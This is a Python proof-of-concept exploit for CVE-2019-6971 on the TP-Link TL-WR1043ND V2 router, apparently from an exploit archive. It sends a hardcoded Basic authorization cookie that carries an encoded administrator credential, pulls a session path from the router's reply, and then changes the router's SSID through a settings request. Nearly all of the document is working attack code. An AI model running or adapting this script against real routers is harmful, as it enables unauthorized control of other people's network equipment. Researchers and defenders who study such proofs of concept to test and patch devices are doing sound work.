# Exploit Author: Uriel Kosayev
# Vendor Homepage: https://www.tp-link.com
# Version: TL-WR1043ND V2
# Tested on: TL-WR1043ND V2
# CVE : CVE-2019-6971
# CVE Link: https://nvd.nist.gov/vuln/detail/CVE-2019-6971

import requests

ascii = &#039;&#039;&#039;
  __________        __    _       __  
 /_  __/ __ \      / /   (_)___  / /__
  / / / /_/ /_____/ /   / / __ \/ //_/
 / / / ____/_____/ /___/ / / / / ,<   
/_/ /_/         /_____/_/_/ /_/_/|_|  

&#039;&#039;&#039;
print(ascii)
Default_Gateway = raw_input("Enter your TP-Link router IP: ")

# Constants
url = &#039;http://&#039;
url2 = &#039;/userRpm/LoginRpm.htm?Save=Save&#039;
full = url + Default_Gateway + url2
# full = str(full)

# The full GET request with the cookie authorization hijacked
req_header = {
    &#039;Host&#039;: &#039;{}&#039;.format(Default_Gateway),
    &#039;User-Agent&#039;: &#039;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0&#039;,
    &#039;Accept&#039;: &#039;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#039;,
    &#039;Accept-Language&#039;: &#039;en-US,en;q=0.5&#039;,
    &#039;Accept-Encoding&#039;: &#039;gzip, deflate&#039;,
    &#039;Referer&#039;: &#039;http://{}/userRpm/LoginRpm.htm?Save=Save&#039;.format(Default_Gateway),
    &#039;Connection&#039;: &#039;close&#039;,
    &#039;Cookie&#039;: &#039;&#039;&#039;Authorization=Basic%20QWRtaW5pc3RyYXRvcjpjM2JiNTI5NjdiNjVjYWY4ZWRkMWNiYjg4ZDcwYzYxMQ%3D%3D&#039;&#039;&#039;,
    &#039;Upgrade-Insecure-Requests&#039;: &#039;1&#039;
}

try:
    response = requests.get(full, headers=req_header).content
except requests.exceptions.ConnectionError:
    print("Enter a valid Default Gateway IP address\nExiting...")
    exit()
generate = response.split(&#039;/&#039;)[3] # Gets the randomized URL "session ID"


option_1 = input("Press 1 to check if your TP-Link router is vulnerable: ")

if option_1 is 1:

    if generate in response:
        print(&#039;Vulnerable!\n&#039;)
        option_2 = input(&#039;Press 2 if you want to change the router\&#039;s SSID or any other key to quit: &#039;)
        if option_2 is 2:
            newssid = raw_input(&#039;New name: &#039;)
            ssid_url = &#039;/userRpm/WlanNetworkRpm.htm?ssid1={}&ssid2=TP-LINK_660A_2&ssid3=TP-LINK_660A_3&ssid4=TP-LINK_660A_4&region=43&band=0&mode=5&chanWidth=2&channel=1&rate=83&speedboost=2&broadcast=2&brlssid=&brlbssid=&addrType=1&keytype=1&wepindex=1&authtype=1&keytext=&Save=Save&#039;.format(
                newssid)
            changessid_full = url + Default_Gateway + &#039;/&#039; + generate + ssid_url
            requests.get(changessid_full, headers=req_header)
            print(&#039;Changed to: {}&#039;.format(newssid))
        else:
            ("Please choose the correct option.\nExiting...")
            exit()
    else:
        print(&#039;Not Vulnerable&#039;)
        exit()
else:
    print("Please choose the correct option.\nExiting...")
    exit()

